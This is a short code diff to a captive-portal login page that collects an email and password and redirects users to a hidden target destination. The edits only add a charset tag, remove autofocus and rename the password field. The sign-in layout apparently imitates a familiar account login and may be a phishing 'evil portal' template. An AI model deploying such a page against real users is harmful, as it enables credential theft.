@@ -17,6 +17,7 @@ require_once('helper.php');
         }, 100);
       }
     </script>
+    <meta charset='UTF-8'>
     <link rel="stylesheet" href="assets/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/style.css">
     <script src="assets/js/jquery-2.2.1.min.js"></script>
@@ -29,8 +30,8 @@ require_once('helper.php');
               <img class="profile-img" src="assets/img/photo.png" alt="">
               <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
                 <input type="hidden" name="target" value="<?=$destination?>">
-                <input type="text" name="email" class="form-control" placeholder="Email" required autofocus>
-                <input type="password" name="pass" class="form-control" placeholder="Password" required><br>
+                <input type="text" name="email" class="form-control" placeholder="Email" required>
+                <input type="password" name="password" class="form-control" placeholder="Password" required><br>
                 <button class="btn btn-primary btn-block" name="login" type="submit">
                   Sign in</button>
                 <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
